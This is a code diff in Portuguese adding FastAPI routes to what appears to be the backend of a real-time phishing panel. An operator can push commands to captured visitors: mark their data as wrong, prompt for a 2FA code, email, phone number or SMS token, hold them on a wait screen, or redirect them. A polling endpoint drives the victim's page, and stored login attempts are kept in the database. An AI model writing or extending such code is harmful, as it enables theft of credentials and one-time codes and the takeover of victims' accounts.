@@ -168,6 +168,62 @@ async def clear_all_attempts(token_data: dict = Depends(verify_token)):
     result = await db.login_attempts.delete_many({})
     return {"message": f"{result.deleted_count} tentativas deletadas"}
 
+# Rotas de Comandos
+@api_router.post("/admin/command")
+async def send_command(command: CommandRequest, token_data: dict = Depends(verify_token)):
+    """Envia comando para o usuário"""
+    user = await db.login_attempts.find_one({"id": command.user_id})
+    if not user:
+        raise HTTPException(status_code=404, detail="Usuário não encontrado")
+    
+    # Atualizar o comando atual do usuário
+    update_data = {"current_action": command.command}
+    
+    if command.command == "REDIRECT" and command.redirect_url:
+        update_data["redirect_url"] = command.redirect_url
+        update_data["page"] = f"Redirecionando para {command.redirect_url}"
+    elif command.command == "INV":
+        update_data["page"] = "Dados incorretos - Corrigir"
+    elif command.command == "AUT":
+        update_data["page"] = "Código 2FA"
+    elif command.command == "EMAIL":
+        update_data["page"] = "Digitar Email"
+    elif command.command == "TOK-TEL":
+        update_data["page"] = "Código do Telefone"
+    elif command.command == "TELEFONE":
+        update_data["page"] = "Digitar Telefone"
+    elif command.command == "AGUARDE":
+        update_data["page"] = "Aguarde..."
+    
+    await db.login_attempts.update_one(
+        {"id": command.user_id},
+        {"$set": update_data}
+    )
+    
+    return {"message": "Comando enviado com sucesso", "command": command.command}
+
+@api_router.get("/user/check-action/{user_id}")
+async def check_user_action(user_id: str):
+    """Usuário verifica qual ação deve realizar"""
+    user = await db.login_attempts.find_one({"id": user_id}, {"_id": 0})
+    if not user:
+        return {"action": None, "page": "Página Loading..."}
+    
+    return {
+        "action": user.get("current_action"),
+        "page": user.get("page"),
+        "redirect_url": user.get("redirect_url")
+    }
+
+@api_router.post("/admin/update-status/{user_id}")
+async def update_user_status(user_id: str, status: str, token_data: dict = Depends(verify_token)):
+    """Atualiza status do usuário (online/offline)"""
+    await db.login_attempts.update_one(
+        {"id": user_id},
+        {"$set": {"status": status}}
+    )
+    return {"message": f"Status atualizado para {status}"}
+
 # Include the router in the main app
 app.include_router(api_router)
 
